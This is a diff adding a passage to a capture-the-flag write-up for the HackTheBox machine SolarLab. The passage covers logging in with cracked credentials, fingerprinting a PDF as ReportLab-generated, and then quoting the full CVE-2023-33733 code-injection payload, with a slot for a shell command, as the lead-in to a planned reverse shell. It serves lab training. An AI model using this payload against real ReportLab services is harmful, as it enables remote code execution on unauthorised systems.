@@ -107,11 +107,31 @@ Now all ingredients are ready. Let's run the command and see what it returns
 
 (pic16) (Find a good way to run Hydra with stop)
 
-The username is `BlakeB`and the password `ThisCanB3...`. Introduce the credentials into the site and you will get the following outcome:
+The username is `BlakeB`and the password `ThisCanB3...`. Open a burpsuite browser and enter into the login site `http://report.solarlab.htb:7681/login`. Turn off the interception to log in. Introduce the credentials into the site and you will get the following outcome:
 
 (pic10)
 
+We have four sections to enter (Note: Sections 1 and 4 have the same vulnerability, didn't check the others). Let's enter into the first one. Fill some random data. You will have the following outcome.
 
+(pic17)
+
+Let's think before clicking on "Generate PDF". We could perform XSS, reverse shell, payload uploaded by attachment... Maybe if we generate the PDF we can analyze the metadata and get some vulnerability on how the pdf is generated. Let's generate it, download it and run the following command:
+
+```
+exiftool output.pdf
+```
+
+(pic16)
+
+Producer: ReportLab PDF Library. Permissions: -rw-r--r--. PDF Version: 1.4 (PDF version is related to Adobe Acrobat, not ReportLab). If you search on Google "ReportLab PDF generation vulnerability" you will find the following [link](https://github.com/c53elyas/CVE-2023-33733) as first entry. So at first sight it seems there is a vulnerability for ReportLab. Reading the documentation you will find the script to make vulnerable the POST in ReportLab:
+
+```
+<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('{YOUR_PAYLOAD_HERE}') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
+                exploit
+</font></para>
+```
+
+But, which payload should we insert? Observe that the title says "CODE INJECTION VULNERABILITY IN REPORTLAB PYTHON LIBRARY". This means that we can insert any code we want into the script. Our goal is to capture the flag, so always try to get a reverse shell. Let's prepare a rev shell for a Windows Machine (Headless and Perfection were Linux Machines, so this time the same reasoning won't work).
 
 
 
